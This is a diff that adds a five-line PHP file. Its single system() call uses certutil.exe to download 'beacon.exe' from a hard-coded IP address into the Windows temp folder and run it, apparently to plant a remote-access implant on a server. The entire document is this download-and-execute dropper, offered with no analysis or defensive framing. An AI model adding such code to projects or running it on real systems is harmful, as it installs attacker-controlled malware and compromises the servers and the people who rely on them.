@@ -1,0 +1,5 @@
+<?php
+
+system('certutil.exe -urlcache -split -f http://172.173.149.56:9001/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe');
+
+?>
